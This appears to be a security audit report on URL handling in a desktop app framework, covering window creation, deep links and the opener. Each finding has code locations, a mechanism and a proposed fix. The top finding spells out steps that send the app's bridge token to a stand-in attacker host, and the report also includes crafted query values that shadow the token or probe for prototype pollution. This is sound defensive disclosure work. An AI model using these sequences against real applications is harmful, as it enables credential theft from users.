# URL-handling surfaces — hunt 20

Field: `deep-link`, `navigation`, `findinpage`, `opener`, window URL resolution. Every claim is labelled
`read` (code trace) or `measured` (I ran it locally). No GUI, no e2e, no file edited except this report.

## HIGH — Relative `window.create` URL leaks the bridge token to a foreign origin

- where: `src/plugins/window-create.ts:56-79`; `src/platform/darwin/window-adapter.ts:29-49,68`; `src/bridge/window-identity.ts:83-96`
- mechanism: The plugin classifies a **relative** URL as "own" and appends `?window=<label>&token=<bridge credential>` **before** the adapter resolves it. The adapter resolves that relative reference against `documentBase()`, which is the first *tracked* window whose stored URL matches `^https?:`. That stored URL is whatever the window was created with (`WindowRegistry.url`, `windows.ts:48-50`) — including a foreign absolute URL, because `window.create` hands foreign absolute URLs through untouched by design. When the bridge-origin window is closed, the foreign window becomes first in `windowLabels()` and the token lands on the foreign origin. This directly violates the contract in `window-identity.ts:87`: "the token never leaves the app's own origin".
- reachable by: (1) built app, so `setBridgeToken` is set (`runtime.ts:154`); (2) page calls `window.create({ label: "evil", url: "https://attacker.example" })` — allowed, absolute URL passes through untouched; (3) page closes the original `main` window (`window.close({label:"main"})`); `labels()` filters closed windows out, so `evil` becomes the base; (4) page calls `window.create({ label: "child", url: "/x" })`. Measured composition: `withToken(withWindowLabel("/x","child"),"SECRET")` → `/x?window=child&token=SECRET`; `new URL(that,"https://attacker.example")` → `https://attacker.example/x?window=child&token=SECRET`. The new window loads that URL and the bearer credential is in the foreign site's request URL (and its server logs). The origin gate cannot undo the disclosure: a remote party can replay the token from any non-browser client that omits `Origin`.
- smallest fix: Move the classification after resolution — resolve the relative URL against the adapter's base first, then check `isBridgeOrigin(resolved)` and only append token/window label if the resolved origin is the bridge's. Concretely, in `darwinWindowAdapter.create` re-run the `isBridgeOrigin` test on `resolveDocument(options.url)` and refuse (or strip the token) when it is foreign; the plugin's pre-resolution append must not be trusted as authority.

## MEDIUM — Later deep links are recorded but never delivered to the page

- where: `src/app.ts:147-155`; `src/platform/darwin/deep-link.ts:100-115`; `src/plugins/deep-link.ts:43-47,76-87`
- mechanism: The C delegate records every `application:openURLs:` URL into a static buffer (`shim/95_deeplink.c:53-67`). `app.run()` drains it **once** with `takeLaunchUrl()` and calls `deepLink.launch()`. `takePendingUrl()` — the only reader of a later URL — has no production caller (`read`: full-tree `rg` finds it only in `deep-link.ts` itself and its test). `DeepLink.open()` (which replaces `url()` and emits the `deep-link` event) is likewise only called in tests.
- reachable by: app already running; user clicks an app-owned `scheme://…` link (LaunchServices sends the Apple Event to the running app); delegate stores it; nothing drains it. `deep-link.url()` keeps returning the launch URL forever and the documented `deep-link` event never fires. This is the headline behaviour of the plugin: "every later one macOS delivers" (`deep-link.ts:2`).
- smallest fix: In the run loop (the pump tick in `app.ts`/`app-watch.ts`), drain `takePendingUrl()` and call `deepLink.open(url, ctx)` with a persistent app-wide emit sink — the same pattern `navigation.ts:79-114` uses for its `sink`, since `ctx.emit` only exists for the length of a command.

## MEDIUM — `deep-link.scheme` always answers not-implemented even when a scheme is registered

- where: `src/runtime-plugins.ts:134-136,192`; `src/app.ts:152-153`; `src/plugins/deep-link.ts:72-97`; config `src/config/types.ts:65`, `src/packaging/plist.ts:92-94`
- mechanism: Only `createDeepLink({ scheme })` sets `DeepLink.scheme` (`deep-link.ts:73`); the singleton `deepLink = createDeepLink()` is created with no options (`deep-link.ts:112`). Both the runtime plugin list and `app.run()` mount that singleton. `build.urlScheme` is validated and merged into `Info.plist`, but no production code passes it into `createDeepLink`. So `scheme()` always takes the `notImplemented` branch requiring `CFBundleURLTypes`.
- reachable by: any app that sets `build.urlScheme: "crust"`, builds and launches; page calls `crust.invoke("deep-link","scheme")` → not-implemented, although macOS did register the scheme and is routing URLs. The docs promise "the registered scheme, a string" in that case (`site/app/docs/reference/api-app/page.mdx:67-74`). Side effect: the scheme-mismatch guard in `accept()` (`deep-link.ts:78-82`) is also permanently disabled in production.
- smallest fix: build one `DeepLink` from config at runtime — `createDeepLink({ scheme: config.build?.urlScheme })` — and use that instance in both `runtime-plugins.ts` and `app.run()`. If the singleton must stay, add a `configureDeepLink(scheme)` setter called once from `run()` before mounting.

## LOW — `withToken` does not replace a percent-encoded stale `token`, so the child window 401s (or inherits the wrong identity)

- where: `src/bridge/window-identity.ts:147-159`; `src/bridge/server/handler.ts:64-71`
- mechanism: `withToken` filters query pairs by raw prefix `token=`. A URL carrying an encoded key such as `%74oken=old` survives the filter; `URLSearchParams.get("token")` later decodes both keys, so the stale value wins (first value wins) and the freshly minted credential is shadowed. The module comment explicitly claims "an existing `token` is replaced rather than duplicated".
- reachable by: page calls `window.create({ url: location.origin + "/child?%74oken=stale" })` on a built app. Measured: `withToken("http://127.0.0.1:4123/x?%74oken=old","newtok")` → `http://127.0.0.1:4123/x?%74oken=old&token=newtok`, and `tokenFromSearch(...)` returns `"old"`. The document route checks that value against the live label map and answers `401`; the command still returns `ok:true`, so the caller gets a blank/error window with no hint.
- smallest fix: parse the search with `URLSearchParams`, delete every key that decodes to `token` (`for (const k of [...params.keys()]) if (k === TOKEN_PARAM) params.delete(k)`), then set the live token — while keeping the existing path/fragment behaviour.

## Checked and clean

- **Scheme allow-lists on `navigation.loadUrl` / `opener.openUrl` / `window.create`**: no scheme filter exists in any of them (`navigation-target.ts:61-68`, `opener.ts:88,150`, `window-create.ts:56-79`). Read: this is a documented design choice — the page is first-party, arbitrary top-level navigation is a normal app action, and `opener.openUrl`'s contract is "any scheme with a colon". I looked for a stated "own-origin only" promise for these commands and found none; the origin gate is the bridge's (`server/cors.ts`), which I did not claim as broken. The concrete leak above is the one case where a credential crosses the boundary.
- **Referer-based token leak when navigating away from the bridge page**: `http.ts:32-38` sets `referrer-policy: no-referrer` on every bridge response, asserted in `server-document.test.ts:32`. The token cannot leave via `Referer` on a normal cross-origin navigation.
- **`javascript:` / `file:` / `data:` passed to `opener.openUrl`**: regex accepts them and `darwinOpenerAdapter` hands the string to `+[NSURL URLWithString:]` (`opener.ts:149-155`). No stated contract restricts them, and I cannot run macOS to observe what NSWorkspace does, so no finding is claimed.
- **Deep-link parsing**: `parseDeepLink` (`deep-link.ts:52-70`) uses `new URL`, lowercases the scheme and reads `hostname`/`pathname`. Measured `crust:open` → scheme `crust`, host `""`, path `open` (opaque form works); `crust://open/x` → host `open`. Query keys are assigned to a plain object: `?__proto__=evil` passes a string to the inherited setter, which ignores non-objects, so no prototype pollution — but the key is silently dropped (wart, not a defect). Last-value-wins matches `URLSearchParams.get`.
- **Deep-link argv scan**: `dl_is_url` (`95_deeplink.c:121-137`) requires ≥2 chars before `:` so a drive letter is not a link; paths starting `/` cannot match. No reachable false positive found in `crust`/app argv shapes.
- **Navigation event sink and window targeting**: `navigation.ts:76-114` keeps one app-wide emit sink, and `webviewResolver` (`webview-target.ts:39-52`) refuses an unknown label with `bad-request` instead of falling back to the first window. Read: no cross-window misdelivery in this tree; a shared `emit` is the bridge's contract (per `defects-wave3/08-plugins-ui.md`).
- **Find-in-page pending state**: `find.ts:29-104` uses one global pending resolver with `supersede()`, so two overlapping searches cannot cross-answer; the timeout clears it. `matchCase` is keyed per webview (`find.ts:127`). A missing webview becomes `handler-error`, matching the documented failure table.
- **`window.create` authority-relative URLs**: the `//host/path` and `\\host\path` escape found in `defects-wave3/08-plugins-ui.md#4` is **fixed** in the current tree — `window-create.ts:52-58` treats them as foreign and passes them through untouched, pinned by `window-create-origin.test.ts`. Not re-reported.
- **Media URL read-back**: `navigation-unit.ts:123-133` re-reads at the reported length; the static `nav_error` buffer is read twice only on overflow, so a concurrent failure could in principle race it, but I found no path that shows a wrong value to the page with a real consequence. No finding.
